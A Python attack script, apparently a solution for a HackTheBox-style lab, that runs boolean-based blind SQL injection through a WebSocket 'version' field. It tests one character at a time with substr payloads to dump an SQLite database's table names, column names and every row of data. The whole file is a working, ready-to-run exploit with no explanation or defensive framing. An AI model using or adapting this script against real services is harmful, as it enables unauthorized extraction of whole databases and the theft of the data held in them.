import json, signal, sys
from websocket import create_connection
from pwn import *
import time, string

payloadTemplates = {"TableNames":"(select name from sqlite_schema where type in ('table','view') and name not like 'sqlite_%%' limit %d,1)",
"ColumnNames":"(select name from pragma_table_info('{tableName}') limit %d,1)",
"ValueNames":"(select {columnsName} from {tableName} limit %d,1)"}
alphabet = string.printable
ws_server = "ws://10.129.96.9:5789/version"

def makeRequest(dataJSON):
	wsRequest = create_connection(ws_server)
	wsRequest.send(dataJSON)
	response = wsRequest.recv()
	wsRequest.close()
	return response

def formatOne(s: str, field: str, value: str):
	idx_begin = s.find('{'+field+'}')
	idx_end = idx_begin + len(field) + 2
	return s[:idx_begin] + value + s[idx_end:]

def findValues(payloadTemplate):
	valuesFounded = []

	endOfRows = False
	rowCounter = 0

	while(not endOfRows):
		foundValue = ""
		actualValue.status(foundValue)
		endOfValue = False
		currentPosition = 1
		while(not endOfValue):
			payloadTemplateFormated = payloadTemplate % rowCounter
			for character in alphabet:
				payload = '''" or substr(%s,%d,1) = '%s' -- -''' % (payloadTemplateFormated,currentPosition,character)

				data = {
						"version": payload,
				}

				bar.status(f"Trying {payloadTemplateFormated} with character {character} on position {currentPosition}")

				dataJSON = json.dumps(data)
				resp = makeRequest(dataJSON)
				if resp != '''{"message": "Invalid version!"}''':
					foundValue += character
					actualValue.status(foundValue)
					currentPosition = currentPosition + 1
					break
				elif character == alphabet[-1]:
					endOfValue = True
					rowCounter = rowCounter + 1
					if currentPosition == 1:
						endOfRows = True
					else:
						valuesFounded.append(foundValue)
						log.info(f"  •{foundValue}")
	return valuesFounded

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

#Ctrl + c
signal.signal(signal.SIGINT, def_handler)

bar = log.progress("SQLI Boolean based")
bar.status("Starting")
actualValue = log.progress("Actual value")

print("-----------------------------------------------------------------------------------")
log.info("Table names:")
tables = findValues(payloadTemplates["TableNames"])
print("-----------------------------------------------------------------------------------")

for table in tables:
	log.info(f"Column names from table {table}:")
	columns = findValues(formatOne(payloadTemplates["ColumnNames"],"tableName",table))
	columnsToConcat = (" || ',' || ".join(columns))
	print("\n")
	log.info("Columns: "+columnsToConcat.replace("|| ',' ||","|"))
	payloadWithTable = formatOne(payloadTemplates["ValueNames"],"tableName",table)
	values = findValues(formatOne(payloadWithTable,"columnsName",columnsToConcat))
	print("-----------------------------------------------------------------------------------")
